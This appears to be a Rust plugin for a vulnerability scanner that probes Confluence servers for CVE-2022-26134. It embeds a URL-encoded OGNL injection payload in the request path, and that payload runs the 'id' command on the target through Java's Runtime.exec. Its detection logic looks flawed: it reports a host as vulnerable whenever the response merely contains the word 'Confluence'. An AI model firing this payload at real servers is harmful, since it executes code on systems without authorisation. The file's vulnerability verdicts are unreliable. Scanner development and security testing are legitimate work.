/* http-vuln-cve2022-26134-4 - Confluence OGNL injection probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    if !valid(ctx) {
        return 1;
    }
    let path = "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.getInputStream%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29%29%29%7D/";
    let resp = match http_request(ctx, "GET", path, None, "", "", None, 8192) {
        Some(r) if !r.is_empty() => r,
        _ => {
            set_out(ctx, "http-vuln-cve2022-26134-4: no HTTP response");
            return 0;
        }
    };
    let code = http_status(&resp);
    if contains_ci(&resp, "Confluence") {
        set_out(ctx, &format!("VULNERABLE: {} [{}] (CVE-2022-26134)", path, code));
    } else {
        set_out(ctx, &format!("not vulnerable: CVE-2022-26134 ({} [{}])", path, code));
    }
    0
}
